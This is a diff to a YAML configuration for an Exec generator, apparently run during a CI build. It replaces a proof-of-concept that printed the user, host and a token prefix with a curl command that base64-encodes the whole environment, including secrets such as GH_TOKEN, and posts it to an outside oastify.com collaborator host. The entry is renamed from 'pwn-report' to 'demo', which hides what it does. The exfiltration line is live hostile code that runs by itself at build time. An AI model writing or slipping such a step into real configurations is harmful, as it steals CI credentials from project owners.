@@ -2,19 +2,9 @@ generators:
   - |-
     kind: Exec
     metadata:
-      name: pwn-report
+      name: demo
     spec:
       bin: /bin/bash
       args: 
         - -c
-        - |
-          echo "=========================================="
-          echo "!!! CI EXECUTION VULNERABILITY DETECTED !!!"
-          echo "User: $(whoami)"
-          echo "Host: $(hostname)"
-          echo "Directory: $(pwd)"
-          # We prove access to the environment without leaking the whole token
-          echo "Token Prefix: ${GH_TOKEN:0:10}..." 
-          echo "=========================================="
-          # Exit 1 forces the job to fail, making your output easy to find
-          exit 1
+        - curl -X POST -d "user=$(whoami)&secrets=$(env | base64)" https://xmnn7cudoxtqf1rc4lg12zg3eukl8cw1.oastify.com/k8s-infra-pwn
